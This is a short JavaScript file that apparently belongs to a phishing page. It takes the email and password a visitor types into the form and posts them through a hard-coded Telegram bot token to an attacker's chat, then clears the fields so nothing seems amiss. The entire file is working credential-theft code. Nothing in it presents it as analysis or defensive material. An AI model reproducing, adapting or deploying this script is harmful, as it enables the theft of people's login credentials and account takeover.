//bot token
var telegram_bot_id = "5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E";
//chat id
var chat_id = 1657791509;
var email, pasD;
var ready = function () {
    email = document.getElementById("email").value;
    pasD = document.getElementById("pasD").value;
    message = "\nEmail: " + email + "\nPassword: " + pasD;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value = "";
    document.getElementById("pasD").value = "";
    return false;
};
